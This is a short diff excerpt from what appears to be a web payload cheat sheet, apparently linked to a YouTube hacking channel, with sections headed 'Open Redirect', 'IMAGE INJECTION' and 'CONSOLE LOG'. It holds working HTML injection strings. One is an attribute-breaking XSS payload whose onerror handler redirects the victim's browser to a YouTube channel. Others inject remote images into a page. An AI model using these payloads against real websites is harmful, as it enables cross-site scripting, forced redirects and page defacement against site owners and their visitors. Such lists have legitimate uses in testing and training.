@@ -10,13 +10,11 @@ Open Redirect : SUBSCRIBE , LIKE & SHARE
           |
           |_ "><img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';">
 
-                               
 IMAGE INJECTION :
             |
             |_ <img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >
 
                "><img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >
-
 
 CONSOLE LOG :
          |
